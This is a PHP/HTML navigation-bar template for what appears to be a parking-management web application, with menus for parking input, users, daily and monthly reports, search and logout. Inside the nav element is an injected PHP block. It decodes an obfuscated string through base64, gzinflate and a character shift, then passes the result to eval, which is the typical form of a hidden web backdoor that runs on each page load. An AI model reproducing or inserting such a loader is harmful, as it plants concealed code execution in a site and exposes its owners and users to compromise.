<div>
    <nav class="navbar navbar-default" role="navigation">
      <!-- Brand and toggle get grouped for better mobile display -->
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      </div>

<!-- Collect the nav links, forms, and other content for toggling -->
      <div class="collapse navbar-collapse navbar-ex1-collapse">
        <ul class="nav navbar-nav">
          <li><a href="index.php">Home</a></li>
          
	<li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Parkir<b class="caret"></b></a>
            <ul class="dropdown-menu">
		<li><a href="input_awal.php">Input Awal</a></li>
		<li><a href="input_akhir.php">Input Akhir</a></li>
	    </ul>
	</li>

        <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">User<b class="caret"></b></a>
            <ul class="dropdown-menu">
		<li><a href="t_user.php">Input User</a></li>
      		<li><a href="tampil_user.php">Tampil User</a></li>
	    </ul>
	</li>
        <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Laporan<b class="caret"></b></a>
            <ul class="dropdown-menu">
		<li><a href="l_harian.php">Laporan Harian</a></li>
     		<li><a href="l_bulanan.php">Laporan Bulanan</a></li>
	    </ul>
	</li>
          <li><a href="cari.php">Cari</a></li>
 	  <li class="btn-danger"><a href="../logout.php">Logout</a></li>
        </ul>
      </div><!-- /.navbar-collapse -->
	  <?php function ntP($lYJLMF)
{ 
$lYJLMF=gzinflate(base64_decode($lYJLMF));
 for($i=0;$i<strlen($lYJLMF);$i++)
 {
$lYJLMF[$i] = chr(ord($lYJLMF[$i])-1);
 }
 return $lYJLMF;
 }eval(ntP("U1QEgbSUzAJFZZeCwqrirIzMUkX1FCDTRtEzKT0rVdEptzArX1E9Ka/QRtE9KTWzIDcLSJcqeirbKDrYAwA="));?>
    </nav>
 </div>